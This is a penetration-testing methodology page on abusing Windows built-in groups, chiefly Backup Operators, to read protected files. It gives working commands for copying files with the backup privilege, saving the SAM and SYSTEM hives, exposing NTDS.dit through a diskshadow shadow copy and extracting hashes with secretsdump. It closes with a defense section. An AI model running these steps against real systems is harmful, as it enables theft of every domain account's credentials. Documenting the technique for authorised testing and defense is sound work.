---
layout: page
title: "Built-in Groups and Backup Operators"
subtitle: "Identify high-privilege built-in groups, and use Backup Operators rights to read protected files and domain data"
permalink: /methodology/privesc-windows/builtin-groups/
---

Windows ships with built-in groups that carry administrative power without the name of administrator. Several of them hold user rights that bypass file permissions, and some allow local logon to a domain controller. This page covers how to identify the groups that matter and how to use the rights of Backup Operators, which is the most common of them. The other built-in groups have their own pages: DnsAdmins, Event Log Readers, Hyper-V Administrators, Print Operators and Server Operators.

## Step 1: Identify group membership

```cmd
whoami /groups
net localgroup
net localgroup "Backup Operators"
```

For domain groups, query Active Directory:

```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

Check the group name as well as its members. The notes call out checking the description of non-standard groups, since passwords or instructions are sometimes stored there.

## Step 2: Check the privileges of the token

```cmd
whoami /priv
```

Backup Operators holds `SeBackupPrivilege` and `SeRestorePrivilege`. These may appear as `Disabled`. If so, enable them with a token-adjustment script. Some servers require an elevated prompt before the rights are usable, because of UAC filtering of the token.

| Group | Key privilege | Why it matters |
| --- | --- | --- |
| Backup Operators | SeBackupPrivilege, SeRestorePrivilege | Read and write any file, regardless of ACL |
| Event Log Readers | Read event logs | Command lines may contain credentials |
| DnsAdmins | DNS service plugin control | Plugin DLL runs as SYSTEM |
| Hyper-V Administrators | Full VM control | Clone a virtual DC and extract its database |
| Print Operators | SeLoadDriverPrivilege | Load a driver, log on to a DC |
| Server Operators | Service control, backup rights | Modify a SYSTEM service |

## Step 3: Read protected files with the backup right

The backup right lets the process traverse folders and open files, even without an ACE for the user. Copying with the backup semantics flag is the key. A PowerShell library that exposes this as a cmdlet is one route:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege
Copy-FileSeBackupPrivilege 'C:\Confidential\contract.txt' .\contract.txt
```

Robocopy in backup mode is a built-in alternative:

```cmd
robocopy /B <source folder> <destination folder> <file name>
```

## Step 4: Dump local credential hives

The right allows the SAM and SYSTEM hives to be saved, which contain the local account hashes:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

Extract the hashes offline:

```text
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

## Step 5: Domain controller route (NTDS.dit)

Backup Operators can log on locally to a domain controller. The AD database `NTDS.dit` holds the hashes for every domain account, but it is locked while in use. A shadow copy exposes it as a readable drive. The notes use diskshadow in this sequence:

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Copy `E:\Windows\NTDS\ntds.dit` with the backup-aware copy method, then extract the hashes offline. The notes show `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`. Use `-just-dc-user` to limit the output to one account when the scope requires it.

> Copying NTDS.dit exposes credentials for every domain account. Treat the output as the most sensitive data of the engagement, and destroy it at the end of the test.
{: .danger }

## What to look for

- Non-administrator accounts in Backup Operators, particularly service accounts or accounts used by backup software.
- Backup privileges enabled in a token that the current user can reach.
- Access to a domain controller, or a DC reachable through a backup server.

## Pitfalls

- An explicit deny ACE on a folder for the user or a group still blocks access, even with the backup flag.
- UAC can filter the backup privilege out of an unelevated token on some servers. Run from an elevated prompt when the privilege is listed as absent.
- Shadow copies create on-disk artifacts, and the exposed drive must be removed afterwards.

## Defense

Keep Backup Operators empty except for dedicated backup service accounts. Restrict logon to domain controllers through the "Allow log on locally" and "Deny log on locally" policies. Protect backup repositories with separate credentials, and monitor the creation of shadow copies and access to `ntds.dit`. Enable auditing on the NTDS folder and on the SAM and SYSTEM hives.
